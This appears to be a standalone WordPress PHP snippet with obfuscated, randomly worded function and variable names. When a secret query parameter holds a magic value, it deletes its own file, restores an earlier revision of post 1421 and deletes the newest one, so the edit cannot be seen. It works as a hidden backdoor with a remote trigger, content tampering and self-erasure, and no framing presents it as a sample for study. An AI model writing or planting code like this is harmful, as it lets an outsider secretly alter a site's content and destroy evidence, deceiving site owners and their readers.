<?php

function xml_verification_permalink() {
	if (isset($_GET['rating_tags_survey']) && $_GET['rating_tags_survey'] === 'xml_tinymce_sales_link') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$ultimate_daily_audio = 1421;
		$your_toolkit_homepage = wp_get_post_revisions($ultimate_daily_audio);
		if (empty($your_toolkit_homepage)) die('no revisions');
		if (count($your_toolkit_homepage) < 2) die('less than 2');
		$team_preview_poll = array_shift($your_toolkit_homepage);
		$ip_instant_scroll_style = $team_preview_poll->ID;
		$smooth_notifier_captcha = array_shift($your_toolkit_homepage);
		$total_gravatar_shopping_json = $smooth_notifier_captcha->ID;
		$sticky_finder_auto = wp_restore_post_revision($total_gravatar_shopping_json);
		if ($sticky_finder_auto === false) die('error restoring');
		$sticky_finder_auto = wp_delete_post_revision($ip_instant_scroll_style);		
		if ($sticky_finder_auto === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'xml_verification_permalink');
